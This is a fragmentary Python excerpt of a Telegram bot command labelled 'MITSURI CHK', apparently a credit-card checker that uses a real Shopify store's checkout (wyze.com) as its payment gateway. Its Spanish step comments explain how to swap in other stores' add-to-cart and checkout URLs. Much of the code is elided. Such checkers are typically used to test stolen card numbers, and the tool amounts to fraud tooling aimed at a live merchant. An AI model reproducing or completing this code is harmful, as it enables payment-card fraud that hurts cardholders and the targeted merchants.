...
@Client.on_message(filters.command("ze", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ</b>
<b>ESTADO: <code>ON | Premium</code>
GATEWAY: <code>ZEUS</code>
PASARELA: <code>SHOPIFY $32.64</code>
</b>""")
...
""")
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '42865705713826'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.wyze.com/cart/add', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.wyze.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.wyze.com"
        }
